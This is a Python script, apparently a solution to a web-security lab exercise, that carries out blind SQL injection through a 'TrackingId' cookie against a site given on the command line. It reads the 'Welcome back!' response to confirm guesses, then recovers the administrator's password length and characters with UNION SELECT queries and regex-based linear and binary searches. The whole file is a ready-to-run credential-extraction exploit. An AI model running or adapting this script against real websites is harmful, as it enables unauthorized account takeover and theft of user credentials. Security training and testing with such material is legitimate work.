import requests, sys, time, urllib.parse, string
from bs4 import BeautifulSoup

#Strips the URL down which is passed in at run time
site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

url = f'https://{site}/'


#List useed for the linear search through the password
characters = ["a", "b", "c", "d", "e", "f",
              "g", "h", "i", "j", "k", "l",
              "m", "n", "o", "p", "q", "r",
              "s", "t", "u", "v", "w", "x",
              "y", "z", "0", "1", "2", "3",
              "4", "5", "6", "7", "8", "9"]
try_password = []
query_pass = f"x' UNION SELECT username FROM users WHERE username='administrator' AND password"

#Attempts to run the most current injection that was generated from any of
#the functions it called from
#takes a query as the arg
def try_query(query):
    """
    Runs query on site for accuracy.
    Performs/Parses the data returned to determine if the request is valid

    args:
        query: the test query to be run
    
    returns:
        true/false: depending on if the test was successful
    """
    #print(f'Query: {query}')
    mycookies = {'TrackingId': urllib.parse.quote_plus(query) }
    resp = requests.get(url, cookies=mycookies)
    soup = BeautifulSoup(resp.text, 'html.parser')
    if soup.find('div', text='Welcome back!'):
        return True
    else:
        return False

def DetermineLength():
    '''
    Determines the length of the password
    by locating the admin password length in SQL

    Args:
        none
    '''
    #Tests the query fucntion
    try_query("""x' OR 1=1 --""")
    try_query("""x" OR 1=1 --""")

    begin_time = time.perf_counter()
    num = 1
    while True:
        query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND length(password)={num}--"
        print(f'Trying length {num}')
        if try_query(query) == False:
            num = num + 1
        else:
            break

    #print(f"Password length is {num}")
    #print(f"Time elapsed is {time.perf_counter()-begin_time}")
    return(num)

def LinearSearch(arr, password_length):
    '''
    First Loop:
        Begins Linear search to determine the password for the program
        First for loop collects the first character of the password
    Second Loop:
        Iterates through the rest of the password
        -Takes the number of characters from above 
        and uses that as a bound.

    Args:
        arr:the test set of characters used to find password
        password_length: the total length of the suspect
    '''
    for i in range(len(characters)):
        query1 = f"{query_pass} ~ '^{characters[i]}'--"
        if try_query(query1) == False:
            pass
        else:
            print(f"Password begins with {characters[i]}")
            try_password.append(characters[i])
            break

    for i in range(password_length-1):
        #print(f"Current Portion of Password: {try_password[0]}")
        for i in range(len(characters)):
            query2 = f"{query_pass} ~ '^{try_password[0]+characters[i]}'--"
            if try_query(query2) == False:
                pass
            else:
                print(f"Password starts with {try_password[0]+characters[i]}")
                try_password[0] = try_password[0]+characters[i]
                break
    return(try_password[0])

def GetMatch(try_password):
    """
    Performs a test query to see if the password matches

    Args:
        try_pass: is the password variable used to store
                    already found portion of the password
    Returns: 
        True/False depending on if the query is correct    
    """ 
    query = f"{query_pass} ~ '^{try_password}$'--"
    if try_query(query) == True:
        print(f"Found pass: {try_password}")
        return True
    return False

def BinarySearchRec(try_pass, arr, high_point, low_point):
    """
    Takes the total problem of finding the password,
    divides it in half and proceeds to run subqueries 
    until the complete password is found

    This is is recursive portion for the BinarySearch function
    Args:
        try_pass: is the password variable used to store
                    already found portion of the password
        arr: the test set of characters used to find password
        high_point: the upper bound for the binary search
        low_point: the lower bound of the binary search
              
    """  
    if high_point >= low_point:
        #Finds the middle point for splitting up the password search
        middle_point = (high_point + low_point) // 2

        #IF query is true, pass and middle are valid
        if try_pass is not None:
            query = f"{query_pass} ~ '^{try_pass+arr[middle_point]}'--"
        else:
            query = f"{query_pass} ~ '^{arr[middle_point]}'--"

        if try_query(query) == True:
            return arr[middle_point]
        
        
        if try_pass is not None:
            query = f"{query_pass} ~ '^{try_pass}[{arr[:middle_point]}]'--"
        else:
            query = f"{query_pass} ~ '^[{arr[:middle_point]}]'--"
        
        #checks all the characters in password up to the middle point
        #then moves to lower point
        if try_query(query) == True:
            return BinarySearchRec(try_pass, arr, middle_point-1, low_point)
        else:
            return BinarySearchRec(try_pass, arr, high_point, middle_point+1)


def BinarySearch(arr):
    """
    Takes the total problem of finding the password,
    divides it in half and proceeds to run subqueries 
    until the complete password is found
    Args:
        arr: takes in an array of potential characters 
        that the program will use to find the password
              
    """      
    max_attempts = 50

    try_pass = BinarySearchRec(None, arr, len(arr)-1, 0)

    exit = False
    while GetMatch(try_pass) == False:
        print(try_pass)
        if GetMatch(try_pass) == True:
            exit = True
        elif max_attempts == 0:
            print("No more attempts allowed.")
            exit = True
        
        try_pass += BinarySearchRec(try_pass, arr, len(arr)-1, 0)
        max_attempts -= 1

if __name__ == '__main__':
    # print("Getting Length of Password String...")
    # length = DetermineLength()
    # print(f'Password Length: {length}')

    # print("Finding Password...")
    # LinearSearch(characters, length)
    # print(f'Password: {try_password}')

    character_set = string.ascii_lowercase + string.digits

    BinarySearch(character_set)

